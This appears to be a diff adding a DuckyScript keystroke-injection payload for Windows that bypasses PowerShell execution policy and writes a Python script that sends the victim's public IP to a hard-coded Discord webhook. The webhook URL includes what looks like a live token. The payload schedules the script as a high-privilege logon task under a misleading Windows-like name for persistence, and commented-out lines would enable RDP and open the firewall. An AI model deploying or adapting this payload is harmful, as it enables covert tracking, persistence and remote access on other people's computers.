@@ -1,0 +1,159 @@
+REM     Title: Persistent public IP logger
+
+REM     Author: kuhi
+
+REM     Description: This payload is meant to write a python script and schedule a task to send the public ip to a discord webhook on every boot.
+
+REM     Target: Windows 10, 11
+
+
+
+REM Run Powershell as admin
+GUI r
+DELAY 500
+STRING powershell -NoP -Ep Bypass
+ENTER
+DELAY 2000
+
+REM Write python persistance_ip.py script
+STRING $payload = "$env:TEMP\persistance_ip.py"
+ENTER
+STRING $code = @"
+ENTER
+STRING import requests
+ENTER
+ENTER
+STRING def obtener_ip_publica():
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING response = requests.get("https://api.ipify.org?format=json")
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING ip = response.json()["ip"]
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING return ip
+ENTER
+ENTER
+STRING def enviar_a_discord(ip, webhook_url):
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING data = {
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+SPACE
+SPACE
+SPACE
+SPACE
+STRING "content": f"IP: {ip}",
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+SPACE
+SPACE
+SPACE
+SPACE
+STRING "username": "IP Bot"
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING }
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING result = requests.post(webhook_url, json=data)
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING return result
+ENTER
+STRING webhook_url = "https://discord.com/api/webhooks/1186312460114866237/F9WGTNdapP1bbQkt2NSUSW9YWx-uKo1LaIlJGQ_CyGTTTjm6TLxHkh12kwwGXXQvXoQN"
+ENTER
+STRING try:    
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING ip_publica = obtener_ip_publica()
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING resultado = enviar_a_discord(ip_publica, webhook_url)
+ENTER
+STRING except:
+ENTER
+SPACE
+SPACE
+SPACE
+SPACE
+STRING pass
+ENTER
+STRING "@
+ENTER
+STRING Set-Content -Path $payload -Value $code
+ENTER
+DELAY 1000
+STRING python $payload
+ENTER
+REM ALT-F4
+
+REM Write .ps1 script to run on boot
+STRING $pshell = "$env:TEMP\persistance_ip.ps1"
+STRING $pcode = @"
+ENTER
+STRING python "$env:TEMP\persistance_ip.py"
+ENTER
+STRING "@
+ENTER
+STRING Set-Content -Path $pshell -Value $pcode
+ENTER
+DELAY 1000
+
+REM Create task to run script on boot
+STRING schtasks /create /sc onlogon /tn "Windows boot stack priority" /tr $pshell /rl highest
+ENTER
+DELAY 1000
+STRING python $payload
+ENTER
+
+REM Run Powershell with admin rights
+REM GUI r
+REM DELAY 500
+REM STRING powershell -NoP -Ep Bypass
+REM CTRL-SHIFT ENTER
+REM DELAY 2000
+REM LEFTARROW
+REM ENTER
+REM DELAY 2000
+
+REM Enable RDP
+REM STRING Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+REM ENTER
+REM STRING Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+REM ENTER
